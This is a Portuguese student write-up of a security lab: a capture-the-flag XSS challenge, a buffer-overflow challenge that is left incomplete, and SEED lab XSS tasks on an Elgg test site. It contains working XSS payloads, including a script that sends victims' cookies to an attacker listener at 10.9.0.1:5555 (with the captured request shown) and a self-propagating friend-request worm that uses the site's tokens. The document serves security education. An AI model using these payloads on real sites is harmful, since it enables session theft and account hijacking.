# CTF 10 #

**Desafio 1**

Nesta tarefa, é-nos pedido uma 'justificação' para o administrador da aplicação web nos fornecer a
flag correta. Ora, esta justificação nada mais é do que código _javascript_ que usará a vulnerabilidade
em estudo na semana em questão, **_Cross-site scripting_**.

Após enviar a justificação, verificamos que existem dois botões, desativados: 
- um deles permite ao administrador marcar o pedido como lido;
- o outro é o botão que ele usará para nos fornecer a flag.

Precisamos então apenas de forjar um clique no segundo botão.
O código _HTML_ deste botão é o seguinte:

![código botão](Week%2010/ctf1%20button.png).

Para simular um click neste botão, usamos o seu _id_ e a função _click()_ de __javascript_, resultando no
seguinte código, que colocaremos na nossa justificação:
```javascript
<script> document.getElementById('giveflag').click(); </script>
```

Deste modo, quando o administrador analisar o nosso pedido, o botão que nos dá a flag é automaticamente
pressionado e obtemos a seguinte resposta por parte do administrador:

![flag](Week%2010/ctf1%20flag.png).

**Desafio 2** 

No segundo desafio da semana em questão, é-nos pedido para obter a flag a partir de uma vulnerabilidade já explorada 
anteriomente, o _buffer overflow_.

O objetivo prende-se em abrir uma shell no servidor correspondente, de modo a obter a flag.

Ao correr o ficheiro `program` com o utilitário `checksec` verificamos que esta possui as seguintes proteções:

![proteções](Week%2010/ctf2%20permissions.png)

Como não existe canário na stack, a nossa tarefa torna-se mais fácil e existe a possibilidade de, através de 
um _buffer overflow_, cumprir o nosso objetivo.

Correndo o programa, verificamos que o endereço do buffer é o seguinte:
`0xffa4de40`

# Tarefas da Semana #10 #

Uam vulnerabilidade do tipo _Cross-site scripting_ ou XSS é geralmente encontrada em aplicações web e faz com
que um atacante consiga injetar código malicioso no navegador da vítima.

**Task 1: Posting a Malicious Message to Display an Alert Window**

O objetivo desta tarefa é incorporar código _javascript_ no nosso perfil da aplicação web. Desta forma, quando
um outro utilizador consultar o nosso perfil, esse código será executado e uma mensagem de alerta aparcerá no
ecrã.

O código _javascript_ a incorporar é o seguinte:
```javascript
<script> alert ('XSS'); </script>
```

1. Editar o perfil de um utilizador (neste caso a Alice) de modo a incorporar o código malicioso.
![](Week%2010/task1%20edit.png)
2. Ao visitar o perfil do utilizador depois de editar a informação, deparámo-nos com a mensagem de alerta
esperada:
![](Week%2010/task1%20visit.png)

**Task 2: Posting a Malicious Message to Display Cookies**

Nesta tarefa, temos por objetivo incorporar código _javascript_ de modo a que, quando um utilizador visite
o nosso perfil, as _cookies_ desse utilizador serão mostradas na janela de alerta.

O código _javascript_ a incorporar é o seguinte:
```javascript
<script>alert(document.cookie);</script>
```

1. Editar o perfil de um utilizador (neste caso a Alice) de modo a incorporar o código malicioso.
![](Week%2010/task2%20edit.png)
2. Ao visitar o perfil do utilizador depois de editar a informação, deparámo-nos com a mensagem de alerta
esperada:
![](Week%2010/task2%20visit.png)

**Task 3: Stealing Cookies from the Victim’s Machine**

No ataque da tarefa anterior, apenas o utilizador conseguia consultar as suas cookies, e não o atacante.
Nesta tarefa, queremos que o código _javascript_ envie as cookies para nós (o atacante).

Para tal, o nosso código malicioso vai inserir uma tag `<img>` na qual o atributo `<src>` será a máquina
do atacante.

Quando o browser tenta carregar a imagem do URL dado no atributo `<src>`, decorre um pedido _HTTP GET_ enviado
à maquina do atacante. O código abaixo, envia as cookies para a porta _5555_.

```javascript
<script>
    document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');
</script>
```

1. Colocar um _listener_ na porta _5555_, de modo a obter as _cookies_ do utilizador.
```shell
[01/08/22]seed@VM:~/Week10$ nc -lknv 5555
Listening on 0.0.0.0 5555
```
2.Editar o perfil de um utilizador (neste caso a Alice) de modo a incorporar o código malicioso.
![](Week%2010/task3%20edit.png)
3.Ao visitar o perfil do utilizador depois de editar a informação, obtemos as cookies do utilizador que está
a visitar o perfil vulnerável:
```shell
[01/08/22]seed@VM:~/Week10$ nc -lknv 5555
Listening on 0.0.0.0 5555
Connection received on 10.0.2.4 57010
GET /?c=Elgg%3Ddj765kt3mifr2ale8vg3arpj99 HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice
```

**Task 4: Becoming the Victim’s Friend**

Nesta tarefa vamos por em prática um ataque similar àquele que o _MySpace_ sofreu em 2005 (_Samy Worm_).

Vamos escrever um _worm_ XSS de modo a que qualquer user que visite o perfil da Samy, a adicione como amiga.

Necessitámos de código malicioso _javascript_ que force um pedido HTTP diretamente do navegador da vítima, 
sem qualquer intervenção do atacante.

De modo a forçar um pedido da amizade por parte da vítima, primeiro temos que perceber como é que tal é feito,
de forma legítima pelo website. Deste modo, é possível escrever um programa _javascript_ que envie o mesmo 
pedido HTTP. Em baixo encontra-se o código que permite completar a tarefa:

```javascript
<script 
    type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // 1
        var token="&__elgg_token="+elgg.security.token.__elgg_token; // 2 
        
        //Construct the HTTP request to add Samy as a friend.
        var sendurl=...; //FILL IN
        
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```
O código acima é colocado no perfil da Samy, na secção _About me_ . Esta secção permite dois modos de edição:
- Modo editor (por defeito)
- Modo texto

O modo editor adiciona código HTML extra ao texto inserido no campo. Uma vez que não queremos isto, deveremos
habilitar o modo texto antes de inserir o código _javascript_.

1. Visitar o perfil da Samy, a partir de um outro utilizador de modo a consultar o URL que permite adiconar 
a Samy como amiga e copiar esse link.

![](Week%2010/task4%20copy.png)

Url copiado : 
```
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1641657155&__elgg_token=o7lnmOZwwTicyb0reWqiyQ
```

Deste modo, o código a inserir no campo da Samy é o seguinte: 
```javascript
<script 
    type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // 1
        var token="&__elgg_token="+elgg.security.token.__elgg_token; // 2 
        
        //Construct the HTTP request to add Samy as a friend.
        var sendurl= "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;


    //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

2. Fazer _login_ no perfil da Sam e inserir na secção _About me_ o código malicioso em questão:
![](Week%2010/task4%20edit.png)

3. Fazer _login_ com outro utilizador, e verificar que o nosso _worm_ foi criado com sucesso:

![](Week%2010/task4%20worm.mp4)

[Link to video](Week%2010/task4%20worm.mp4)
